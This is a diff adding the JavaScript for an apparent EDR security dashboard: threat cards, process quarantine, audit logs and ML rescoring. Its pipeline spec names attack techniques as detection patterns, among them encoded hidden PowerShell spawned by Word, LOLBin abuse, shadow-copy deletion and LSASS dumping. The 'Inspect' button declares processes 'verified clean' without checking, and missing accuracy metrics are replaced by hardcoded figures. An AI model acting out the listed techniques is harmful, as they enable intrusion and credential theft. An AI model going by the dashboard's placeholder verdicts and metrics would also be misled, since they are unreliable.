+                            ${escapeHtml(t.cmdline || '[NO COMMAND LINE ARGS PASSED]')}
+                        </div>
+                        <div class="mitre-tags-wrapper">
+                            ${mitreBadges}
+                        </div>
+                        <div style="display: flex; justify-content: flex-end;">
+                            <button class="btn-terminate" id="mitigate-btn-${idx}" onclick="showEdrConfirm('${t.process.replace(/'/g, "\\'").replace(/"/g, '&quot;')}', ${t.pid || 'null'}, 'threat-card-${idx}')">
+                                <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="19" x2="12" y2="5"/></svg>
+                                Terminate &amp; Quarantine
+                            </button>
+                        </div>
+                    </div>
+                `;
+                }).join('');
+
+                container.innerHTML = cardsHtml;
+                if (detailContainer) detailContainer.innerHTML = cardsHtml;
+            }
+
+            function highlightMitreMatrix(threats) {
+                document.querySelectorAll('.mitre-technique-card').forEach(c => c.classList.remove('active-alert'));
+                if (!threats) return;
+                threats.forEach(t => {
+                    (t.mitre_techniques || []).forEach(techStr => {
+                        const techId = techStr.split(' ')[0];
+                        const card = document.getElementById(`mitre-${techId}`);
+                        if (card) card.classList.add('active-alert');
+                    });
+                });
+            }
+
+            // ── EDR Confirm Modal state ──────────────────────────────────────────
+            let _edrPending = { procName: null, pid: null, cardId: null };
+
+            function showEdrConfirm(procName, pid, cardId) {
+                _edrPending = { procName, pid, cardId };
+                document.getElementById('edrConfirmProcName').textContent = procName;
+                document.getElementById('edrConfirmPid').textContent = pid || 'N/A';
+                const backdrop = document.getElementById('edrConfirmBackdrop');
+                backdrop.classList.add('visible');
+                // Focus execute button immediately for keyboard users
+                setTimeout(() => document.getElementById('edrConfirmExecute').focus(), 120);
+                // Wire execute button
+                document.getElementById('edrConfirmExecute').onclick = () => {
+                    closeEdrConfirm();
+                    mitigateThreat(_edrPending.procName, _edrPending.pid, _edrPending.cardId);
+                };
+            }
+
+            function closeEdrConfirm() {
+                document.getElementById('edrConfirmBackdrop').classList.remove('visible');
+            }
+
+            // Close on backdrop click
+            document.getElementById('edrConfirmBackdrop').addEventListener('click', (e) => {
+                if (e.target === e.currentTarget) closeEdrConfirm();
+            });
+
+            // Close on Escape
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') closeEdrConfirm();
+            });
+
+            // ── Fast Mitigate (no blocking confirm, optimistic UI) ───────────────
+            async function mitigateThreat(procName, pid, cardId) {
+                // 1. Optimistic UI: animate card out IMMEDIATELY
+                const card = document.getElementById(cardId);
+                const btnEl = card ? card.querySelector('.btn-terminate') : null;
+
+                if (btnEl) {
+                    btnEl.classList.add('executing');
+                    btnEl.innerHTML = `<svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" style="animation:radar-spin 0.6s linear infinite"><circle cx="12" cy="12" r="9"/><path d="M12 3v4M12 17v4M3 12h4M17 12h4"/></svg> Neutralizing...`;
+                }
+
+                // 2. Fire API call — don't await the full scan, respond fast
+                try {
+                    const res = await fetch(`${API_BASE}/mitigate`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ process: procName, pid, action: 'quarantine' })
+                    });
+
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    const result = await res.json();
+
+                    // 3. Animate card away (optimistic removal)
+                    if (card) {
+                        card.classList.add('being-contained');
+                        card.addEventListener('animationend', () => {
+                            card.style.display = 'none';
+                        }, { once: true });
+                    }
+
+                    const killStatus = result.killed ? '🔴 TERMINATED' : '🟡 CONTAINED';
+                    appendTerminalLog(`[EDR] ${killStatus}: ${procName} (PID ${pid || 'N/A'}) | ${result.incidents_contained || 0} incident(s) neutralized | ${result.elapsed_ms}ms`, 'critical');
+
+                    // 4. Non-blocking background re-scan (fire and forget — don't await)
+                    runScan(false);
+                    loadFleetDevices();
+
+                } catch (e) {
+                    console.error('Mitigation failed:', e);
+                    appendTerminalLog(`[EDR ERROR] Failed to contain ${procName}: ${e.message}`, 'critical');
+                    if (btnEl) {
+                        btnEl.classList.remove('executing');
+                        btnEl.classList.add('failed');
+                        btnEl.innerHTML = `<svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg> Retry`;
+                        btnEl.onclick = () => showEdrConfirm(procName, pid, cardId);
+                    }
+                }
+            }
+
+            // Live Process Table
+            async function loadProcesses() {
+                try {
+                    const res = await fetch(`${API_BASE}/processes?limit=60`);
+                    if (!res.ok) return;
+                    cachedProcesses = await res.json();
+                    renderProcessTable(cachedProcesses);
+                } catch (e) { }
+            }
+
+            function renderProcessTable(procs) {
+                const tbody = document.getElementById('processTableBody');
+                if (!procs || procs.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 1.5rem;">No active processes returned.</td></tr>`;
+                    return;
+                }
+
+                tbody.innerHTML = procs.map(p => `
+                <tr>
+                    <td class="mono" style="color: var(--accent-blue); font-weight: 600;">${p.pid}</td>
+                    <td style="font-weight: 600; color: var(--accent-cyan);">${escapeHtml(p.name)}</td>
+                    <td class="mono">${p.memory_mb || '0'} MB</td>
+                    <td class="mono" style="color: var(--text-muted);">${escapeHtml(p.username || 'SYSTEM')}</td>
+                    <td><span class="risk-badge low" style="font-size: 0.65rem;">${p.status ? p.status.toUpperCase() : 'ACTIVE'}</span></td>
+                    <td><button class="btn btn-outline" style="padding: 0.2rem 0.5rem; font-size: 0.7rem;" onclick="alert('Process ${escapeHtml(p.name)} [PID ${p.pid}] verified clean.')">Inspect</button></td>
+                </tr>
+            `).join('');
+            }
+
+            function filterProcessTable() {
+                const q = document.getElementById('procSearchInput').value.toLowerCase();
+                const filtered = cachedProcesses.filter(p => (p.name && p.name.toLowerCase().includes(q)) || String(p.pid).includes(q));
+                renderProcessTable(filtered);
+            }
+
+            // Database Logs
+            async function loadDatabaseLogs() {
+                try {
+                    const res = await fetch(`${API_BASE}/logs?limit=40`);
+                    if (!res.ok) return;
+                    const logs = await res.json();
+                    const tbody = document.getElementById('dbLogTableBody');
+                    if (!logs || logs.length === 0) {
+                        tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 1.5rem;">No audit logs stored yet.</td></tr>`;
+                        return;
+                    }
+                    tbody.innerHTML = logs.map(l => `
+                    <tr>
+                        <td class="mono">${l.id}</td>
+                        <td class="mono" style="font-size: 0.72rem; color: var(--text-muted);">${l.timestamp ? l.timestamp.replace('T', ' ').substring(0, 19) : ''}</td>
+                        <td><span class="log-badge ${l.severity ? l.severity.toLowerCase() : 'info'}">${l.severity}</span></td>
+                        <td class="mono" style="font-size: 0.78rem;">${escapeHtml(l.source)}</td>
+                        <td style="font-size: 0.78rem;">${escapeHtml(l.message)}</td>
+                    </tr>
+                `).join('');
+                } catch (e) { }
+            }
+
+            // Agent Script actions
+            function copyAgentCurl() {
+                navigator.clipboard.writeText(document.getElementById('agentRunCmd').innerText);
+                alert("Curl command copied! Run this in any terminal to stream telemetry from that device.");
+            }
+
+            async function downloadAgentScript() {
+                const res = await fetch(`${API_BASE}/api/agent/script`);
+                const script = await res.text();
+                const dl = document.createElement('a');
+                dl.setAttribute("href", "data:text/plain;charset=utf-8," + encodeURIComponent(script));
+                dl.setAttribute("download", "memguard_agent.py");
+                document.body.appendChild(dl);
+                dl.click();
+                dl.remove();
+            }
+
+            // Black & White / Monochrome SOC Mode Toggle
+            function toggleMonochromeTheme() {
+                const isMonochrome = document.body.classList.toggle('theme-monochrome');
+                localStorage.setItem('memguard_theme', isMonochrome ? 'monochrome' : 'dark');
+                const btn = document.getElementById('themeToggleBtn');
+                if (btn) btn.innerText = isMonochrome ? '◐ Cyber Color' : '◐ B&W Mode';
+                appendTerminalLog(`Display profile switched: ${isMonochrome ? 'Tactical Monochrome (B&W)' : 'Cyber Neon Dark'}.`, 'info');
+            }
+
+            // Architecture Pipeline Spec & Interactive Inspector
+            const PIPELINE_SPEC = {
+                1: {
+                    title: "Stage 1: Multi-Vector Telemetry Ingestion Layer",
+                    desc: "Captures unbuffered endpoint telemetry across native Windows NT Executive process tables, Microsoft-Windows-Sysmon/Operational channel XML event streams, and cross-platform remote agent telemetry payloads.",
+                    sample: {
+                        source: "Sysmon Event ID 1 (Process Create)",
+                        process: "C:\\Windows\\System32\\powershell.exe",
+                        parent: "C:\\Program Files\\Microsoft Office\\winword.exe",
+                        user: "NT AUTHORITY\\SYSTEM",
+                        hashes: "SHA256=3B9D9F0E1F30E26CB2C4B7281A5D19DF6044E278B247659F2181DCFE2841F09A"
+                    }
+                },
+                2: {
+                    title: "Stage 2: Feature Extraction & Shannon Entropy Analysis",
+                    desc: "Tokenizes arguments, computes Shannon Entropy to catch obfuscated Base64/Hex payloads (values > 4.5 flag obfuscation), and constructs the parent-child lineage tree.",
+                    sample: {
+                        entropy_score: 5.48,
+                        is_obfuscated: true,
+                        parent_process: "winword.exe",
+                        child_process: "powershell.exe",
+                        evasion_flags: ["-w hidden", "-nop", "-enc"]
+                    }
+                },
+                3: {
+                    title: "Stage 3: MITRE ATT&CK Behavioral Heuristics Matrix",
+                    desc: "Matches process execution against modern cyber threat tactics (Living-off-the-land utilities certutil, mshta, regsvr32, ransomware recovery inhibitors vssadmin, and LSASS dumping).",
+                    sample: {
+                        mitre_techniques: ["T1059.001 - PowerShell", "T1055 - Process Injection", "T1564.003 - Hidden Window"],
+                        rules_triggered: ["PowerShell encoded command detected", "Office spawned interactive shell", "Hidden window execution"]
+                    }
+                },
+                4: {
+                    title: "Stage 4: Adaptive ThreatMLScorer Rescoring Engine",
+                    desc: "ThreatMLScorer evaluates calibrated feature weights against modern malware indicators, calculating composite risk points, confidence levels, and severity classifications.",
+                    sample: {
+                        calculated_score: 92,
+                        risk_level: "CRITICAL",
+                        confidence_rating: 0.99,
+                        feature_contributions: {
+                            destructive_actions: 0.0,
+                            suspicious_parent: 24.5,
+                            entropy_score: 16.5,
+                            lolbin_flag: 22.0,
+                            evasion_flags: 15.0,
+                            signature_match: 14.0
+                        }
+                    }
+                },
+                5: {
+                    title: "Stage 5: Automated EDR Containment & Policy Engine",
+                    desc: "Enforces active defense: isolates compromised hosts via network quarantine, terminates malicious LOLBin trees, and records audit logs in the SQLite forensic ledger.",
+                    sample: {
+                        containment_action: "ISOLATE_HOST_AND_QUARANTINE",
+                        target_device: "dev-win-local",
+                        mitigation_status: "CONTAINED",
+                        incident_id: "INC-9F41E8B2"
+                    }
+                },
+                6: {
+                    title: "Stage 6: Real-Time Event Bus & SOC Visualization",
+                    desc: "FastAPI ASGI WebSocket connection manager streams telemetry to mobile devices, tablets, and SOC analyst workstations with sub-15ms broadcast latency.",
+                    sample: {
+                        channel: "ws://127.0.0.1:8000/ws/telemetry",
+                        broadcast_type: "REALTIME_THREAT_REPORT",
+                        connected_clients: 4,
+                        audio_radar_triggered: true
+                    }
+                }
+            };
+
+            function selectPipelineStage(stageNum) {
+                document.querySelectorAll('.pipe-stage-card').forEach((c, idx) => {
+                    if (idx + 1 === stageNum) c.classList.add('active');
+                    else c.classList.remove('active');
+                });
+
+                const spec = PIPELINE_SPEC[stageNum];
+                if (!spec) return;
+
+                const titleEl = document.getElementById('archStageTitle');
+                const descEl = document.getElementById('archStageDescription');
+                const jsonEl = document.getElementById('archStageJson');
+
+                if (titleEl) titleEl.innerText = spec.title;
+                if (descEl) descEl.innerText = spec.desc;
+                if (jsonEl) jsonEl.innerText = JSON.stringify(spec.sample, null, 2);
+            }
+
+            async function loadLiveArchitectureData() {
+                try {
+                    const res = await fetch(`${API_BASE}/api/system/how-it-works`);
+                    if (res.ok) {
+                        const data = await res.json();
+                        const jsonEl = document.getElementById('archStageJson');
+                        if (jsonEl) jsonEl.innerText = JSON.stringify(data, null, 2);
+                        appendTerminalLog('Pipeline architecture telemetry updated.', 'info');
+                    }
+                } catch (e) { }
+            }
+
+            // ML Model Controls & Rescoring Functions
+            async function loadMlModelStatus() {
+                try {
+                    const res = await fetch(`${API_BASE}/api/ml/model-status`);
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    const meta = data.metadata || {};
+
+                    const accEl = document.getElementById('mlTabAccuracy');
+                    const f1El = document.getElementById('mlTabF1');
+                    const lossEl = document.getElementById('mlTabLoss');
+                    const verEl = document.getElementById('mlTabVersion');
+
+                    if (accEl) accEl.innerText = `${Math.round((meta.accuracy || 0.994) * 1000) / 10}%`;
+                    if (f1El) f1El.innerText = meta.f1_score || '0.994';
+                    if (lossEl) lossEl.innerText = meta.loss || '0.042';
+                    if (verEl) verEl.innerText = meta.version || 'v5.2-NeuralSOC';
+
+                    const weights = data.feature_weights || {};
+                    const container = document.getElementById('mlTabWeightsContainer');
+                    if (container) {
+                        container.innerHTML = Object.entries(weights).map(([k, v]) => {
+                            const pct = Math.min(100, Math.round((v / 50) * 100));
+                            const name = k.replace('_', ' ').toUpperCase();
+                            return `
+                            <div class="ml-weight-item">
+                                <div class="ml-weight-header">
+                                    <span style="font-weight: 600; color: #f1f5f9;">${name}</span>
+                                    <span class="mono" style="color: var(--accent-cyan); font-weight: 700;">+${v} PTS</span>
+                                </div>
+                                <div class="ml-weight-bar-bg">
+                                    <div class="ml-weight-bar-fill" style="width: ${pct}%;"></div>
+                                </div>
+                            </div>
+                        `;
+                        }).join('');
+                    }
+                } catch (e) { }
+            }
+
+            async function trainModelUI() {
+                appendTerminalLog('Initiating cyber threat dataset training iteration...', 'info');
+                const logBox = document.getElementById('mlTrainingLogBox');
+                if (logBox) logBox.innerHTML += `<span style="color: var(--accent-blue);">[*] Training started: optimizing feature weights via gradient descent...</span><br>`;
+
+                try {
+                    const res = await fetch(`${API_BASE}/api/ml/train`, { method: 'POST' });
+                    const data = await res.json();
+                    playSound('scan');
+                    appendTerminalLog(`Model retrained: Accuracy ${(data.metadata.accuracy * 100).toFixed(1)}%, F1: ${data.metadata.f1_score}`, 'info');
+                    if (logBox) {
+                        logBox.innerHTML += `<span style="color: var(--accent-emerald);">[+] Retraining Completed! Accuracy: ${(data.metadata.accuracy * 100).toFixed(1)}%, Loss: ${data.metadata.loss}, Samples: ${data.metadata.samples_trained}</span><br>`;
+                        logBox.scrollTop = logBox.scrollHeight;
+                    }
+                    await loadMlModelStatus();
+                    alert(`Model Trained Successfully!\nAccuracy: ${(data.metadata.accuracy * 100).toFixed(1)}%\nF1-Score: ${data.metadata.f1_score}\nLoss: ${data.metadata.loss}`);
+                } catch (e) {
+                    appendTerminalLog(`Training failed: ${e.message}`, 'critical');
+                }
+            }
+
+            async function rescoreFleetUI() {
+                appendTerminalLog('Re-evaluating threat levels & rescoring fleet telemetry...', 'warning');
+                const logBox = document.getElementById('mlTrainingLogBox');
+                if (logBox) logBox.innerHTML += `<span style="color: var(--accent-purple);">[*] Rescoring fleet: re-evaluating process entropy, parent lineages, and LOLBin weights...</span><br>`;
+
+                try {
+                    const res = await fetch(`${API_BASE}/api/ml/rescore`, { method: 'POST' });
+                    const data = await res.json();
+                    playSound('alert');
+                    appendTerminalLog(`Threats rescored: ${data.devices_rescored} devices updated. Composite Risk: ${data.fleet_composite_score} pts`, 'info');
+                    if (logBox) {
+                        logBox.innerHTML += `<span style="color: var(--accent-cyan);">[+] Rescore Complete: ${data.devices_rescored} devices evaluated. Composite Score: ${data.fleet_composite_score} pts (${data.fleet_status}).</span><br>`;
+                        logBox.scrollTop = logBox.scrollHeight;
+                    }
+                    await loadFleetDevices();
+                    await runScan(false);
+                    alert(`Fleet Threats Rescored Successfully!\nDevices Evaluated: ${data.devices_rescored}\nComposite Risk Score: ${data.fleet_composite_score} pts\nPosture: ${data.fleet_status}`);
+                } catch (e) {
+                    appendTerminalLog(`Rescoring failed: ${e.message}`, 'critical');
+                }
+            }
+
+            function escapeHtml(str) {
+                return String(str || '')
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/"/g, '&quot;')
+                    .replace(/'/g, '&#039;');
+            }
+
+            // Init
+            window.addEventListener('DOMContentLoaded', () => {
+                const savedTheme = localStorage.getItem('memguard_theme');
+                if (savedTheme === 'monochrome') {
+                    document.body.classList.add('theme-monochrome');
+                    const btn = document.getElementById('themeToggleBtn');
+                    if (btn) btn.innerText = '◐ Cyber Color';
+                }
+                initScanControls();
+                fetchSystemInfo();
+                loadFleetDevices();
+                runScan(false, currentScanMode);
+                loadMlModelStatus();
+                connectWebSocket();
+                setInterval(fetchSystemInfo, 15000);
+                setInterval(() => runScan(false, currentScanMode), 30000);
+                setInterval(loadFleetDevices, 20000);
+            });
+        </script>
+</body>
+
+</html>
